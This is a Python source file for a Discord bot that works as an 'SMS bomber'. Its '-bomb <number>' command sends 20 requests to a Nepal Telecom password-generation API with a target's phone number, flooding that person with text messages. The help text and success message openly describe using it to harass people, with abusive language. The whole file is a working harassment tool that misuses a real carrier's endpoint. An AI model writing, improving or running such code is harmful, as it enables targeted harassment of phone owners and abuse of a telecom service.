import discord
from discord.ext import commands
import requests
import urllib3

bot = commands.Bot(command_prefix='-')
client = discord.Client()

@client.event
async def on_ready():
    await bot.change_presence(activity=discord.Game('With your chicks "-help" '))
    print('We have logged in as {0.user}'.format(bot))

@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('-------------')

bot.remove_command('help')
@bot.command()
async def help(ctx):
    embed = discord.Embed(title='SMS Bomber', description='SPAM YOUR FRIEND NTC SIM WITH SMS BOMB', color=0xeee657)
    embed.add_field(name='-bomb <number>', value='As simple as that, is he playing game? Nice, bomb him', inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def bomb(ctx):
    if ctx.message.author == client.user:
        return
    elif ctx.message.channel.name == 'dm':
        return
    else:
        discordinput = (ctx.message.content[6:16])
        victim = {"phone": discordinput}
        for i in range(20):
            requests.post(url="https://cms.ntc.net.np/api/generateAuthPassword", params=victim)
        print("we are here")
        embed = discord.Embed(title='', description='' + ctx.message.author.mention, color=0xeee657)
        embed.add_field(name='SUCCESS ', value='Fucked that mother fucker with 20 sms')
        await ctx.send(embed=embed)

@bot.event
async def on_command_error(error, ctx):
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.channel("No such command")



bot.run('your bots token here')
